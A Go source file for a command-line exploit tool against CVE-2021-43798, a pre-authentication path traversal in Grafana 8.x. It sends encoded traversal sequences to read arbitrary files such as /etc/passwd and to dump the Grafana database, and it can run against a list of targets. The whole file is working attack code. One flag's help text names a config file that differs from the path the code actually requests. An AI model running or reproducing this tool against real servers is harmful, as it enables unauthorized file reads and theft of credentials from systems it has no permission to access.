package main

import (
	"bufio"
	"crypto/tls"
	"errors"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
)

type Options struct {
	list         string
	target       string
	file         string
	output       string
	dumpDatabase bool
	dumpConfig   bool
}

var client = &http.Client{
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	},
}

func log(level, message string) {
	fmt.Printf("[%s] %s\n", strings.ToUpper(level), message)
	if level == "fatal" {
		os.Exit(1)
	}
}

func main() {
	options := &Options{}

	flag.StringVar(&options.list, "list", "", "List of targets")
	flag.StringVar(&options.target, "target", "", "Single target to run against")
	flag.StringVar(&options.file, "file", "", "Path to file (Ex: /etc/passwd)")
	flag.StringVar(&options.output, "output", "", "Output to file (Only for single targets)")
	flag.BoolVar(&options.dumpDatabase, "dump-database", false, "Dump sqlite3 database (/var/lib/grafana/grafana.db)")
	flag.BoolVar(&options.dumpConfig, "dump-config", false, "Dump defaults.ini config file (conf/defaults.ini)")
	flag.Parse()

	if options.list != "" && options.target != "" {
		log("fatal", "Cannot specify both list and single target")
	}
	if options.list != "" && options.output != "" {
		log("fatal", "Cannot output to file when using list")
	}
	if options.list == "" && options.target == "" {
		log("fatal", "Must specify targets (-target http://localhost:3000)")
	}
	if options.dumpDatabase || options.dumpConfig {
		if options.file != "" {
			log("fatal", "Cannot dump database while using file")
		}
		if options.dumpDatabase && options.dumpConfig {
			log("fatal", "Cannot dump database and config at the same time")
		}
	} else {
		if options.file == "" {
			log("fatal", "File path must be specified (-file /etc/passwd)")
		}

		if !strings.HasPrefix(options.file, "/") {
			log("fatal", "File path must start with a / (-file /etc/passwd)")
		}
	}

	fmt.Println("CVE-2021-43798 - Grafana 8.x Path Traversal (Pre-Auth)")
	fmt.Print("Made by Tay (https://github.com/taythebot)\n\n")

	if options.list != "" {
		f, err := os.Open(options.list)
		if err != nil {
			log("fatal", fmt.Sprintf("Failed to open list: %s", err))
		}
		defer f.Close()

		scanner := bufio.NewScanner(f)
		for scanner.Scan() {
			target := scanner.Text()

			log("info", fmt.Sprintf("Exploiting target %s", target))
			output, err := exploit(target, options.file, options.dumpDatabase, options.dumpConfig)
			if err != nil {
				log("error", fmt.Sprintf("Failed to exploit target %s: %s", target, err))
			} else {
				log("info", fmt.Sprintf("Successfully exploited target %s", target))
				fmt.Println(output)
			}
		}
	} else {
		log("info", fmt.Sprintf("Exploiting target %s", options.target))
		output, err := exploit(options.target, options.file, options.dumpDatabase, options.dumpConfig)
		if err != nil {
			log("error", fmt.Sprintf("Failed to exploit target %s: %s", options.target, err))
		} else {
			log("info", fmt.Sprintf("Successfully exploited target %s", options.target))
			fmt.Println(output)

			if options.output != "" {
				f, err := os.Create(options.output)
				if err != nil {
					log("fatal", fmt.Sprintf("Failed to create output file: %s", err))
				}
				defer f.Close()

				if _, err := f.Write([]byte(output)); err != nil {
					log("fatal", fmt.Sprintf("Failed to write to output file: %s", err))
				}

				log("info", fmt.Sprintf("Succesfully saved output to file %s", options.output))
			}
		}
	}
}

func exploit(target, file string, dumpDatabase, dumpConfig bool) (string, error) {
	url := target + "/public/plugins/alertlist/"
	if dumpConfig {
		url += "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fopt/install.txt"
	} else if dumpDatabase {
		url += "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fvar/lib/grafana/grafana.db"
	} else {
		url += "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f" + file
	}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", err
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36")

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}

	if resp.StatusCode != 200 {
		return "", errors.New("status code is not 200")
	}

	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	bodyString := string(body)

	if bodyString == "seeker can't seek\n" {
		return "", errors.New("cannot read requested file")
	}

	return bodyString, nil
}

